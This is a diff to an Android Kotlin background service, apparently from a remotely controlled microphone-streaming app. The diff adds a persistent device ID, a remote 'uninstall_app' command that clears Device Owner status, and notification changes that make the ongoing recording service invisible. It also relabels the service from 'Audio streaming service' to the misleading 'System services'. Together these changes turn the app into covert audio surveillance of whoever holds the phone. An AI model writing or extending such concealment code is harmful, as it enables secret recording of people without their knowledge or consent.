@@ -204,9 +204,24 @@ class MicService : Service() {
 
     // ── Prefs / Device ID ────────────────────────────────────────────────────
     private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
+    
+    // Use Android ID as base for device ID - survives cache clear
     private val deviceId: String by lazy {
-        prefs.getString("device_id", null) ?: UUID.randomUUID().toString().also { id ->
-            prefs.edit { putString("device_id", id) }
+        // First try to get existing ID from prefs
+        prefs.getString("device_id", null) ?: run {
+            // Generate stable ID based on Android ID (survives cache clear but not factory reset)
+            val androidId = android.provider.Settings.Secure.getString(
+                contentResolver, 
+                android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
+            
+            // Create short hash for privacy + readability
+            val stableId = androidId.hashCode().toUInt().toString(16).padStart(8, '0')
+            
+            stableId.also { id ->
+                prefs.edit { putString("device_id", id) }
+                Log.i(TAG, "Generated stable device ID: $id")
+            }
         }
     }
     
@@ -610,6 +625,33 @@ class MicService : Service() {
                     }
                 } catch (e: Exception) {
                     safeSend("ACK:unlock_app:error:${e.message}")
+                }
+            }
+            "uninstall_app" -> {
+                // Uninstall the app (clear device owner first, then uninstall)
+                Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    
+                    // If Device Owner, unlock app first
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        // Clear device owner to allow uninstall
+                        dpm.clearDeviceOwnerApp(packageName)
+                        Log.i(TAG, "Device Owner cleared for uninstall")
+                        safeSend("ACK:uninstall_app:device_owner_cleared")
+                    }
+                    
+                    // Launch uninstall intent
+                    val packageUri = android.net.Uri.parse("package:$packageName")
+                    val uninstallIntent = android.content.Intent(android.content.Intent.ACTION_DELETE, packageUri).apply {
+                        flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
+                    startActivity(uninstallIntent)
+                    safeSend("ACK:uninstall_app:launched")
+                    Log.i(TAG, "Uninstall dialog launched")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to uninstall: ${e.message}")
+                    safeSend("ACK:uninstall_app:error:${e.message}")
                 }
             }
             else -> Log.d(TAG, "Unknown command: $cmd")
@@ -2490,17 +2532,19 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        // IMPORTANCE_LOW keeps a visible ongoing service notification, which
-        // improves survival on aggressive OEM battery managers.
+        // IMPORTANCE_MIN makes notification invisible but still allows foreground service
+        // Device Owner doesn't need visible notification for survival
         val channel = NotificationChannel(
             CHANNEL_ID,
             "Device Services",
-            NotificationManager.IMPORTANCE_LOW
+            NotificationManager.IMPORTANCE_MIN  // Changed from LOW to MIN (invisible)
         ).apply {
-            description = "Audio streaming service"
+            description = "System services"
             setSound(null, null)
             enableVibration(false)
             setShowBadge(false)
+            enableLights(false)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
         }
         getSystemService(NotificationManager::class.java)
             .createNotificationChannel(channel)
@@ -2511,10 +2555,12 @@ class MicService : Service() {
             .setContentTitle("Device Services")
             .setContentText(statusText)
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)  // Changed from LOW to MIN
             .setOngoing(true)
             .setSilent(true)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
+            .setShowWhen(false)  // Hide timestamp
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build()
     }
 
